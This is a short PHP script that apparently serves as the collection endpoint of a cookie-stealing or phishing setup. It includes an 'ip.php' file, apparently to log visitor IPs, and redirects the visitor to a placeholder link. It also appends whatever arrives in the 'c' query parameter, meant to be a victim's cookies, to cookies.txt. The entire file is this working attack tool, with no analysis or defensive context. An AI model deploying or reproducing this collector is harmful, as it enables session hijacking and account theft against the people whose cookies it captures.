<?php

include 'ip.php';
header('Location: redirect_link');

file_put_contents("cookies.txt",  $_GET['c'] . "\n", FILE_APPEND);
exit();
?>
